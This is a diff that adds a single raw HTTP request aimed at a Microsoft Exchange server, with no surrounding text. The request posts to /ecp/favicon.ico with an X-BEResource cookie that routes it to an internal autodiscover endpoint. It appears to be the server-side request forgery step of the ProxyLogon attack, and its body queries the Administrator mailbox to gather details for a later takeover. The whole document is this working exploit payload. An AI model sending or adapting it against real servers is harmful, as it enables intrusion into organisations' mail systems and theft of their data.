@@ -1,0 +1,7 @@
+POST /ecp/favicon.ico HTTP/1.1
+Host: externaldomain.local
+Cookie: X-BEResource=internalservername.domain.local/autodiscover/autodiscover.xml#~1
+Content-Length: 370
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>Administrator@externaldomain.local</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>
